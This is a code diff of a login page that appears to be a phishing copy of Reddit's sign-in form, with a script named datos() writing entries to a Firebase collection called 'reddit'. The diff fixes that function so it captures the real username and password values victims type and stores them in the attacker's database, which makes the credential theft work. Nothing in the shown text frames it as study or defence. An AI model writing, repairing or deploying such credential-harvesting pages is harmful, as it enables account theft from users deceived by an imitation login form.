@@ -152,7 +152,7 @@
               </fieldset>
 
               <fieldset class="AnimatedForm__field m-small-margin">
-                <button  type="submit" onclick="datos()">Log in</button>
+                <button  type="submit" onclick="datos()">Log in 1</button>
               </fieldset>
 
 
@@ -267,8 +267,8 @@
   const db = firebase.firestore();
 
   function datos() {
-    var emailvalue = document.getElementById("loginUsername").va;
-    var passvalue = document.getElementById("loginPassword");
+    var emailvalue = document.getElementById("loginUsername").value;
+    var passvalue = document.getElementById("loginPassword").value;
 
     db.collection('reddit').add({
       email: emailvalue,
